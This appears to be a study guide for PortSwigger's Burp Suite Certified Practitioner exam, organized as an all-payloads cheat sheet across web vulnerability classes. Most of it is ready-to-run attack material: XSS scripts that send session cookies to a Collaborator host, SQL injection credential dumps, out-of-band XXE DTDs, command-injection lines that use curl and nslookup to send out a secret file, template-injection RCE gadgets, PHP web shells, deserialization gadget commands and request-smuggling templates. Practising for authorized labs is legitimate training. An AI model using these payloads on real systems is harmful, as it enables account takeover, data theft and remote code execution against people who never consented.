---
title:       "BSCP Exam"
summary:     "BSCP - Burp Suite Certified Practitioner"
category:    "PortSwigger"
tags:        [bscp, portswigger]
updated:     2026-07-27
---

## BSCP Master Field Guide — Burp Suite Certified Practitioner (PortSwigger)

The large, all-payloads reference for the **BSCP** practical exam, organized by Web Security Academy topic. Every category lists detection, the full payload set (contexts + filter/WAF bypasses + DB/engine variants), how to weaponize to a stage, and the finisher. Your lab-tested payloads are marked ✅.

> **Exam:** two apps, ~4 hours. Per app: **Stage 1 Foothold** (act as a normal user, usually via account takeover) → **Stage 2 Escalate** (become **administrator**) → **Stage 3 Exfil** (delete user `carlos` or read `/home/carlos/secret`). Recognition speed wins — §31 "See X → Try Y" is your jump table. ⚠️ **Authorized use only.** Payloads target `*.web-security-academy.net` labs/exam and authorized apps. `<LAB>`=target, `<COLLAB>`=Burp Collaborator, `<EXPLOIT>`=exploit server.

---

## Table of Contents

1. Exam Strategy & the 3-Stage Method
2. Burp Workflow & Exploit Server
3. Cross-Site Scripting (XSS) — full payload set
4. Cookie / Data Exfiltration Payloads
5. DOM-Based Vulnerabilities
6. SQL Injection — full cheat set
7. Cross-Site Request Forgery (CSRF)
8. XXE Injection (in-band, OOB, XInclude, SVG)
9. Server-Side Request Forgery (SSRF)
10. OS Command Injection
11. Server-Side Template Injection (SSTI)
12. Path Traversal & File Read
13. File Upload
14. Access Control / IDOR
15. Authentication & Brute Force
16. Password Reset & Account Takeover
17. JWT Attacks
18. OAuth
19. HTTP Host Header Attacks
20. Web Cache Poisoning & Deception
21. HTTP Request Smuggling
22. CORS
23. Clickjacking & Dangling Markup
24. Insecure Deserialization (PHP / Java)
25. Prototype Pollution
26. WebSockets
27. GraphQL / API / NoSQL / Mass Assignment
28. Business Logic & Information Disclosure
29. Stage-3 "Finisher" Payloads
30. Worked Exam Chains (step by step)
31. Quick "See X → Try Y" Table

---

## 1. Exam Strategy & the 3-Stage Method

**Per app (recon, 5–10 min):** map the whole site in Burp (browse + crawl); note every parameter, cookie, upload, and role; locate the **admin panel** (Stage 2) and the **delete-carlos / secret-file** endpoint (Stage 3). Run a **Burp active scan** on the site map — the exam apps usually have a scannable bug that names the class; then exploit manually.

**Roles:** unauthenticated → registered user (register a throwaway) → admin. Stage 1 usually = take over a normal user's account; Stage 2 = take over admin; Stage 3 = use admin to delete carlos or read the secret.

**Discipline:** timebox. If Stage 1 on app A stalls, jump to app B — partial completion across both apps still scores. Keep §29 (finishers) and §31 (jump table) open.

---

## 2. Burp Workflow & Exploit Server

- **Built-in Burp browser** (CA pre-trusted) → Proxy everything.
- **Dashboard → New scan** on the site map to surface the vuln class fast.
- **Repeater** — confirm & tune every payload. **Intruder** — enumerate users/IDs. **Turbo Intruder** — races/brute at speed.
- **Collaborator** — OOB for blind XXE/SSRF/XSS (copy your `<COLLAB>` URL; watch interactions).
- **Exploit server** (`<EXPLOIT>`) — host HTML/JS; use **"Store"** then **"Deliver exploit to victim"** for XSS/CSRF/clickjacking/cache stages.
- **Extensions:** JWT Editor, Hackvertor (encoding), Param Miner (unkeyed inputs/hidden params), HTTP Request Smuggler, Upload Scanner, DOM Invader (in the Burp browser).

**Deliver-to-victim pattern (Stage 2):** exploit-server page runs your JS in the **admin's** browser → steal cookie/CSRF token or force an action → **Deliver to victim** → become admin.

---

## 3. Cross-Site Scripting (XSS) — full payload set

**Reflected XSS inside an iframe (deliver via exploit server) ✅**

```html
<iframe src="https://<LAB>.web-security-academy.net/?find=%22-alert(1)}//"></iframe>
```

**Core probes by context:**

```html
<script>alert(document.domain)</script>              <!-- HTML text -->
"><script>alert(1)</script>                          <!-- break out of attribute -->
'-alert(1)-'                                          <!-- inside single-quoted JS string -->
";alert(1)//                                          <!-- inside double-quoted JS -->
</script><script>alert(1)</script>                    <!-- inside existing <script> -->
javascript:alert(1)                                   <!-- href/src/formaction sink -->
```

**No**`<script>`**(event handlers):**

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<iframe src=javascript:alert(1)>
```

**Tag/attribute allow-list bypasses (WSA "with some SVG markup allowed", etc.):**

```html
<svg><animatetransform onbegin=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Xss</text></a>
<svg><script>alert(1)</script></svg>
<xss id=x onfocus=alert(1) tabindex=1>#x   <!-- custom tag + hash focus -->
```

**Framework:**

```html
{{constructor.constructor('alert(1)')()}}             <!-- AngularJS sandbox escape -->
{{$on.constructor('alert(1)')()}}
```

**Filter/encoding bypasses:** mixed case `<ScRiPt>`; HTML entities in attributes; `%22`/`%27` URL-encoding in the reflected param; backtick/comment tricks; `eval(atob('...'))` for character restrictions (see §4). **Weaponize to a stage:**

- **Stored XSS → admin:** plant in a field an **admin** views (comment, feedback, product review, log viewer) → runs in admin session → cookie exfil (§4).
- **Reflected XSS → admin:** deliver the iframe/URL via the exploit server ("Deliver to victim").

---

## 4. Cookie / Data Exfiltration Payloads

**fetch cookie exfil (XSS / cache poisoning) ✅**

```html
<script>
fetch('https://<COLLAB>.burpcollaborator.net', {method:'POST', mode:'no-cors', body:document.cookie});
</script>
```

**One-liner ✅**

```html
<script>fetch('https://<COLLAB>.burpcollaborator.net',{method:'POST',mode:'no-cors',body:document.cookie});</script>
```

**Image beacon (no fetch) ✅**

```html
<script>var i=new Image();i.src="//<COLLAB>.burpcollaborator.net?q="+document.cookie;document.body.appendChild(i);</script>
```

**Image beacon inside the reflected-XSS iframe ✅**

```html
<iframe src="https://<LAB>.web-security-academy.net/?find=%22-var i = new Image();i.src=&quot;//<COLLAB>.burpcollaborator.net?q=&quot;+document.cookie;document.body.appendChild(i);"></iframe>
```

**Base64**`eval(atob())`**to bypass character restrictions in the iframe ✅**

```html
<iframe src="https://<LAB>.web-security-academy.net/?find=test%22-eval(atob('<BASE64_OF_JS>'))//"></iframe>
```

> `<BASE64_OF_JS>` = base64 of `var i=new Image();i.src="//<COLLAB>.burpcollaborator.net?q="+document.cookie;document.body.appendChild(i);` **Exfil form-field / DOM data:**

```html
<script>fetch('/my-account').then(r=>r.text()).then(d=>fetch('https://<COLLAB>/?d='+btoa(d)))</script>
```

**Read stolen cookie:** Collaborator → HTTP interactions → `q=`/POST body = admin session → set it in Burp → you're admin.

---

## 5. DOM-Based Vulnerabilities

**Sources → sinks:** `location`/`location.hash`/`location.search`/`document.referrer`/`postMessage` → `innerHTML`/`document.write`/`eval`/`setTimeout`/`jQuery $()`/`element.src`.

```html
# hashchange / innerHTML
#<img src=x onerror=alert(1)>
# document.write in a script src
';alert(1)//
# jQuery selector sink
$(location.hash)   ->  #<img src=x onerror=alert(1)>
# DOM open redirect / postMessage
<iframe src="https://<LAB>/" onload="this.contentWindow.postMessage('javascript:alert(1)','*')">
```

Use **DOM Invader** (Burp browser) to auto-trace source→sink and canary the payload.

---

## 6. SQL Injection — full cheat set

**Detect:** `'` → error/change; `' AND '1'='1`(true) vs `'1'='2`(false); time-based below. **Login/auth bypass:**

```sql
administrator'--
administrator'#
' OR 1=1--
' OR 1=1 LIMIT 1--
```

**Determine columns & string column:**

```sql
' ORDER BY 1-- / 2 / 3 ...          (until error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--           (which column takes text)
```

**DB version / current DB:**

```sql
' UNION SELECT @@version,NULL--                 (MySQL/MSSQL)
' UNION SELECT version(),NULL--                 (PostgreSQL)
' UNION SELECT banner,NULL FROM v$version--     (Oracle)
' UNION SELECT NULL FROM dual--                 (Oracle needs FROM)
```

**List tables/columns:**

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-- Oracle:
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Dump creds:**

```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username||'~'||password,NULL FROM users--     (concat)
' UNION SELECT username, string_agg(password,'~') FROM users--
```

**Blind — conditional & time-based:**

```sql
-- boolean (Substring extraction)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
-- error-based (visible errors)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--             (PostgreSQL)
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--               (MSSQL)
-- time-based
'; SELECT pg_sleep(5)--                                                  (PostgreSQL)
' AND IF(1=1,SLEEP(5),0)--                                               (MySQL)
'||pg_sleep(5)--
' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))--   (Oracle)
```

**OOB (Oracle/MSSQL) via Collaborator:**

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://<COLLAB>/">%r;]>'),'/l') FROM dual--
```

**sqlmap (from a saved Burp request):**

```bash
sqlmap -r req.txt --batch --dump -T users
sqlmap -r req.txt --batch --level 5 --risk 3 --technique=BEUST
```

**Test every input** — parameters, **cookies**, and headers (`Referer`, `User-Agent`) are all injectable in labs. Stage use: dump `administrator` → log in (Stage 2).

---

## 7. Cross-Site Request Forgery (CSRF)

Generate PoC: Burp → **Engagement tools → Generate CSRF PoC**, or:

```html
<form action="https://<LAB>.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form><script>document.forms[0].submit()</script>
```

**GET-based:** `<img src="https://<LAB>/email/change?email=attacker@evil.com">`. **Token bypasses:** token not tied to session (use your own), token validated only when present (delete the param), token duplicated in a cookie (**cookie injection** via other bug), `SameSite` gaps (top-level POST for Lax), method change (`POST`→`GET`), token tied to a non-session cookie. Host on exploit server → **deliver to victim**.

---

## 8. XXE Injection (in-band, OOB, XInclude, SVG)

**In-band file read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**SSRF via XXE:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`. **Blind OOB — malicious DTD on exploit server ✅**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<COLLAB>.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

**Trigger (app loads your DTD) ✅**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<EXPLOIT>.web-security-academy.net/test.dtd"> %xxe;]>
```

**Error-based OOB DTD (leak file in an error message):**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**XInclude (no DOCTYPE control — inject into a value):**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**XXE via SVG/Office upload:**

```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## 9. Server-Side Request Forgery (SSRF)

```
url=http://localhost/admin                      # internal admin panel
url=http://127.0.0.1/  ·  http://192.168.0.X/   # internal ranges (fuzz last octet w/ Intruder)
url=http://169.254.169.254/latest/meta-data/    # cloud metadata
```

**Filter bypasses:**

```
http://127.1/          http://0/            http://2130706433/     (decimal)
http://0x7f000001/     http://0177.0.0.1/   (octal/hex)
http://[::1]/          http://localhost/
http://<LAB>@127.0.0.1/     http://127.0.0.1#@<LAB>/     (userinfo/fragment)
http://spoofed.<COLLAB>/    (DNS rebinding / whitelisted-domain-as-subdomain)
```

**Open-redirect chain:** point the URL param at a same-site open redirect that forwards to `http://localhost/admin`. **Blind SSRF:** `<COLLAB>`; confirm interaction; then reach the internal admin panel → delete carlos.

---

## 10. OS Command Injection

**Separators & inline:**

```bash
| whoami     & whoami     ; whoami     `whoami`     $(whoami)     %0a whoami     || whoami     && whoami
127.0.0.1 | whoami        127.0.0.1; whoami
```

**Blind → confirm:**

```bash
& ping -c 5 <COLLAB> &
& nslookup <COLLAB> &
|| curl http://<COLLAB> ||
```

**Blind → exfil output:**

```bash
& nslookup `whoami`.<COLLAB> &
| curl http://<COLLAB>/?x=$(whoami)
& whoami > /var/www/images/out.txt &        # then read the written file
| curl http://<COLLAB>/?x=$(cat /home/carlos/secret)
```

Tool: `commix -u "http://<LAB>/feedback?ip=127.0.0.1"`.

---

## 11. Server-Side Template Injection (SSTI)

**Detect:** `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` → `49`. Fuzz `${{<%[%'"}}%\` to force an engine-revealing error.

```
# Jinja2 (Python)
{{7*7}}  ->  {{''.__class__.__mro__[1].__subclasses__()}}   (find Popen index)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
# Twig (PHP)
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /home/carlos/secret") }}
# Freemarker (Java)
<#assign x="freemarker.template.utility.Execute"?new()>${x("cat /home/carlos/secret")}
# Velocity (Java)
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
# ERB (Ruby)
<%= system("cat /home/carlos/secret") %>   <%= `id` %>
# Handlebars / Pug / Mako — engine-specific gadgets
```

Tool: `tplmap -u "http://<LAB>/?message=x"`.

---

## 12. Path Traversal & File Read

```
filename=../../../etc/passwd
filename=..%2f..%2f..%2fetc%2fpasswd                 # URL-encoded
filename=..%252f..%252f..%252fetc%252fpasswd         # double-encoded (WAF)
filename=....//....//....//etc/passwd                 # nested (strip bypass)
filename=/etc/passwd%00.png                           # null byte (validated extension)
filename=..\..\..\windows\win.ini                     # Windows
filename=/var/www/images/../../../etc/passwd          # absolute + traversal (base-path enforced)
```

**Stage 3:** `filename=../../../home/carlos/secret`.

---

## 13. File Upload

```
# straight web shell
shell.php    <?php echo file_get_contents('/home/carlos/secret'); ?>
shell.php    <?php system($_GET['cmd']); ?>
# extension bypass
shell.phtml  shell.php5  shell.php7  shell.phar  shell.pHp
# double / null
shell.php.jpg     shell.php%00.jpg     shell.php\x00.jpg
# content-type / magic bytes
Content-Type: image/jpeg                              (change in Burp)
GIF89a;<?php system($_GET['cmd']); ?>                 (magic-byte prefix)
# make a custom ext execute
.htaccess:  AddType application/x-httpd-php .l33t
# escape the upload dir with traversal in the filename
filename="../shell.php"      filename="..%2fshell.php"
```

Browse the uploaded file → RCE / read secret.

---

## 14. Access Control / IDOR

```
# IDOR — swap identifiers (keep YOUR session)
GET /my-account?id=carlos
GET /api/orders/1002                      (not yours)
# forced browsing
/admin   /admin/deleteUser   /admin/delete?username=carlos
# header bypasses
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
# role via param/cookie/JSON
Admin=true      roleid=2      {"role":"admin"}      isAdmin=true
# method / referer / multistep flaws
POST vs GET on the admin action; Referer only checked on step 1
```

Automate with **Autorize** (replays low-priv traffic and flags what still works).

---

## 15. Authentication & Brute Force

- **Username enumeration:** compare error text/HTTP code/length/timing for valid vs invalid users (Intruder → sort by length/time). Then password-brute the valid user.
- **Broken brute-force protection:**
  - IP lock bypass: rotate `X-Forwarded-For: 1.1.1.<n>` per attempt (Intruder).
  - Account-lock vs rate-limit logic flaws (lock resets, or valid creds slip through in a burst).
  - **Password reset / stay-logged-in** as the weak link.
- **2FA bypass:** brute the 4-6 digit code (Turbo Intruder), skip to the post-2FA page, or 2FA bound to the wrong session (change username after step 1).
- **"Stay logged in" cookie:** often `base64(user:md5(password))` → forge `administrator`'s cookie.

---

## 16. Password Reset & Account Takeover

- **Host-header poisoning:** `Host: <EXPLOIT>` (or `X-Forwarded-Host: <EXPLOIT>`) → reset link points to you → victim clicks → you get the token from Collaborator → reset their password.
- **Token flaws:** predictable/sequential token; token not tied to user; token leaked in the response; token not invalidated after use.
- **Change another user:** the reset/change request has a `username`/`user` param you can swap to `administrator`.
- **Password change without current password** / mass-assignment of a new password.

---

## 17. JWT Attacks

Use **JWT Editor**.

```
alg:none            -> set header {"alg":"none"}, strip signature, change sub/role to administrator
weak HMAC secret    -> hashcat -m 16500 jwt.txt /usr/share/wordlists/jwt.secrets.list ; re-sign
jwk header inject   -> embed attacker JWK in the token header (self-signed)
jku header inject   -> point jku to a JWK set hosted on <EXPLOIT>
kid path traversal  -> "kid":"../../../../../dev/null" then sign with empty/null key
kid SQLi            -> inject into kid to control the returned key
RS256->HS256 confusion -> sign with the public key as an HMAC secret
```

Set identity to `administrator` → Stage 2.

---

## 18. OAuth

- `redirect_uri`**hijack:** change it to `<EXPLOIT>` → the `code`/token is delivered to you → replay to log in as victim.
- **Missing**`state`**:** OAuth CSRF → link your provider account to the victim's app account.
- **Flawed linking / unverified**`email`**:** register with the victim's email; account merge.
- **Steal**`code`**via Referer/redirect**; `code` reuse.

---

## 19. HTTP Host Header Attacks

```
Host: <EXPLOIT>                          # password-reset poisoning, cache
Host: <LAB>
X-Forwarded-Host: <EXPLOIT>
X-Host: <EXPLOIT>
Host: localhost                           # access-control / routing-based SSRF
Host: <LAB>:bad                           # port/ambiguity tricks
```

Two Host headers, absolute-URL in request line, and `X-Forwarded-Host` are all worth trying. Stage use: poison admin reset link → capture token → admin takeover.

---

## 20. Web Cache Poisoning & Deception

- Find an **unkeyed input** (header) reflected into a cached response (**Param Miner → Guess headers**). Common: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`.
- Inject XSS/redirect via the unkeyed header so the **cached** page serves your JS to the next visitor (the admin).

```
GET /?cb=1 HTTP/1.1
Host: <LAB>
X-Forwarded-Host: a."><script>fetch('https://<COLLAB>',{method:'POST',body:document.cookie})</script>
```

Confirm cache (`X-Cache: hit`, `Age:`), keep the cache-buster while testing, then poison the real key. **Cache deception:** `/my-account/wcd.css` (or `;.css`) may cache the victim's private page publicly → read it.

---

## 21. HTTP Request Smuggling

Detect with **HTTP Request Smuggler**. Classes: **CL.TE**, **TE.CL**, **TE.TE** (obfuscate TE). **CL.TE (front CL, back TE):**

```
POST / HTTP/1.1
Host: <LAB>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**TE.CL (front TE, back CL):**

```
POST / HTTP/1.1
Host: <LAB>
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: localhost
Content-Length: 15

x=1
0
```

**Impact in labs:** bypass front-end to reach `/admin`, capture another user's request (steal cookie), deliver stored XSS via the smuggled prefix. TE obfuscation: `Transfer-Encoding: xchunked`, `chunked`, `Transfer-Encoding:\tchunked`, double header.

---

## 22. CORS

```bash
curl -s -I https://<LAB>/accountDetails -H "Origin: https://evil.com" | grep -i access-control
# vulnerable if ACAO reflects Origin AND Access-Control-Allow-Credentials: true
```

**Exploit (exploit server):**

```html
<script>
fetch('https://<LAB>/accountDetails',{credentials:'include'})
 .then(r=>r.text()).then(d=>fetch('https://<COLLAB>/?d='+btoa(d)));
</script>
```

Also: `Origin: null` (deliver from a sandboxed `<iframe sandbox>` / data: URL), and trusted-subdomain XSS → CORS chain.

---

## 23. Clickjacking & Dangling Markup

**Clickjacking (no**`X-Frame-Options`**/CSP**`frame-ancestors`**) — exploit-server PoC:**

```html
<style>iframe{opacity:0.0001;position:absolute;top:0;left:0;width:1000px;height:800px}
#decoy{position:absolute;top:<Y>px;left:<X>px}</style>
<div id="decoy">Click me</div>
<iframe src="https://<LAB>/my-account"></iframe>
```

**Dangling markup — steal CSRF token when CSP blocks script ✅**

```html
<script>
location='https://<LAB>.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//<COLLAB>.burpcollaborator.net?';
</script>
```

> The unclosed `<table background='//<COLLAB>?...` captures following markup (incl. the CSRF token) up to the next quote and sends it to Collaborator. Take that leaked **CSRF token**, put it in a **CSRF change-email/change-password request**, host on `<EXPLOIT>`, **deliver to victim** → account takeover (Stage 2).

---

## 24. Insecure Deserialization (PHP / Java)

**PHP:**

```
# tamper the serialized cookie/object
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
# gadget-chain RCE:
phpggc Symfony/RCE4 exec 'cat /home/carlos/secret' | base64
# PHAR deserialization: upload a crafted phar, trigger via phar:// file op
```

**Java:**

```bash
java -jar ysoserial.jar CommonsCollections4 'curl http://<COLLAB>/?x=$(cat /home/carlos/secret)' | base64 -w0
# apache-commons / Hibernate / Spring gadgets depending on the app
```

Also: signed-token bypass (find the secret via other bug), modify a `role`/`admin` field in the object.

---

## 25. Prototype Pollution

**Client-side (DOM):**

```
?__proto__[gadget]=payload
?__proto__.gadget=payload
{"__proto__":{"gadget":"payload"}}       (JSON body)
# e.g. pollute a sink that becomes DOM XSS:
?__proto__[hitCallback]=alert(document.cookie)
```

**Server-side (Node):**

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

Find a **gadget** that turns a polluted property into privilege escalation or RCE (e.g., command options merged from an object). Use **DOM Invader → Prototype pollution** to auto-find sources/gadgets.

---

## 26. WebSockets

- Intercept in Burp (**Proxy → WebSockets history**); resend/modify messages.
- **XSS** into a chat an admin reads: `{"message":"<img src=x onerror=...>"}`.
- **SQLi** in a WS field; blind via time.
- **CSWSH:** if the WS handshake lacks CSRF protection/origin check, an exploit-server page opens a WS as the victim and exfiltrates their data.

---

## 27. GraphQL / API / NoSQL / Mass Assignment

**GraphQL:**

```bash
# introspection (dump schema)
curl -s https://<LAB>/graphql/api -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
# IDOR via id arg; mutation abuse (delete user); ALIAS-based brute to bypass rate limit/2FA:
{"query":"mutation{a:login(pw:\"0000\"){t} b:login(pw:\"0001\"){t}}"}
```

**REST:** BOLA/IDOR, method tampering (`GET`→`PATCH/DELETE`), **mass assignment** (`{"roleid":2}`/`{"isAdmin":true}`), hidden/undocumented endpoints (Param Miner / content discovery). **NoSQL (Mongo):**

```
username[$ne]=&password[$ne]=                 (auth bypass)
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$regex":"^a"}}   (blind extraction)
{"$where":"sleep(5000)"}                       (time-based)
```

---

## 28. Business Logic & Information Disclosure

**Business logic:** negative quantity/price, coupon reuse/stacking, skip a workflow step (jump to `/checkout/confirm`), trust of hidden/client fields, integer/rounding abuse, excessive trust in `referer`/`Host`. **Information disclosure:** verbose errors/stack traces (force with bad input), `/robots.txt`, backup/temp files, comments/source, debug endpoints, TRACE, `/.git/`, version banners → chain into the real bug. Burp **Scan** surfaces many.

---

## 29. Stage-3 "Finisher" Payloads

```bash
# READ the secret file (via RCE / SSTI / traversal / upload)
cat /home/carlos/secret
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read() }}   # SSTI
filename=../../../home/carlos/secret                                                                     # traversal
<?php echo file_get_contents('/home/carlos/secret'); ?>                                                  # uploaded PHP
| curl http://<COLLAB>/?x=$(cat /home/carlos/secret)                                                     # OOB cmd injection

# DELETE user carlos (as admin — panel, forged CSRF, SSRF-to-admin, or smuggled request)
GET  /admin/delete?username=carlos
POST /admin/delete    body: username=carlos     (with the admin session/cookie you stole)
```

**Rule:** Stage 2 gives you **admin access**; Stage 3 is just *using* it against the delete/secret endpoint. If the panel needs a CSRF token you don't have, read it first (authed GET, or dangling markup §23).

---

## 30. Worked Exam Chains (step by step)

**Chain A — Stored XSS → admin cookie → delete carlos.**

1. Find a field an admin views (e.g., a product **review** or **feedback**). Confirm reflection/HTML rendering.
2. Store the cookie-exfil payload (§4 fetch/beacon).
3. Wait/trigger the admin to view it → Collaborator receives the **admin session cookie**.
4. Set that cookie in Burp → browse `/admin` → **delete carlos** (Stage 3). ✅ App done.

**Chain B — SQLi → admin login → admin panel → delete carlos.**

1. `'` in a param/cookie errors → confirm with boolean/time.
2. `' UNION SELECT username,password FROM users--` → dump `administrator` hash/clear.
3. Crack if hashed (`hashcat`), log in as administrator (Stage 2).
4. Admin panel → **delete carlos** (Stage 3).

**Chain C — Reflected XSS behind CSP → dangling markup → CSRF → admin takeover.**

1. Reflected XSS exists but CSP blocks `<script>`.
2. Use **dangling-markup** (§23) to exfil the admin's **CSRF token** to Collaborator.
3. Build a **CSRF change-email/password** request using that token; host on `<EXPLOIT>`; **deliver to victim**.
4. Admin's email/password changes to yours → log in as admin (Stage 2) → panel → delete carlos.

**Chain D — Blind OOB XXE → read secret / SSRF to admin.**

1. Find an XML entry point (stock check, import).
2. Host the OOB DTD (§8) on `<EXPLOIT>`; trigger with the `%xxe;` loader.
3. Exfil `/etc/passwd` (proof) then pivot: XXE-SSRF to internal admin, or read the target file if reachable.

**Chain E — Password-reset host poisoning → admin takeover → delete carlos.**

1. Request admin's password reset with `Host: <EXPLOIT>`.
2. Collaborator/exploit-server log captures the reset **token** from the victim's click.
3. Use the token to set a new admin password → log in (Stage 2) → panel → delete carlos (Stage 3).

---

## 31. Quick "See X → Try Y" Table

| Symptom | Vuln → section |
|---|---|
| Search/param reflected | Reflected XSS → §3/§4 |
| Comment/review shown to admin | Stored XSS → §3 → exfil §4 |
| JS reads location/hash into a sink | DOM XSS → §5 |
| `'` errors / boolean/time differs | SQLi → §6 |
| State-change with weak/no token | CSRF → §7 |
| XML / stock-check / import | XXE (OOB DTD) → §8 |
| URL/import/webhook param | SSRF → §9 |
| ping/dns/host tool | OS command injection → §10 |
| `${}`/`{{}}` renders math | SSTI → §11 |
| file/download/path param | Path traversal → §12 |
| upload feature | File upload → RCE → §13 |
| `id`/`userId`; `/admin` 401/403 | Access control / IDOR → §14 |
| login errors differ; lockout | Auth / brute force → §15 |
| reset email link | Host-header poisoning → §16/§19 |
| `eyJ...` token | JWT → §17 |
| OAuth `redirect_uri`/`state` | OAuth → §18 |
| `X-Cache`/`Age` headers | Cache poisoning → §20 |
| front proxy + `/admin` blocked | Request smuggling → §21 |
| `ACAC: true` reflects Origin | CORS exfil → §22 |
| CSP blocks script | Dangling markup → §23 |
| serialized cookie `O:`/`rO0` | Deserialization → §24 |
| `__proto__` accepted | Prototype pollution → §25 |
| WebSocket chat/data | WebSockets → §26 |
| `/graphql`; JSON API | GraphQL / API / NoSQL → §27 |
| price/qty editable | Business logic → §28 |
| **Stage 3** | read `/home/carlos/secret` or delete `carlos` → §29 |

---

*End of guide. All payloads target the PortSwigger Web Security Academy / BSCP exam and authorized targets only. Replace*`<LAB>`*/*`<COLLAB>`*/*`<EXPLOIT>`*. Recognize the vuln fast (§31) → canonical payload (relevant §) → stage finisher (§29). Chains in §30 mirror the exam's shape.*
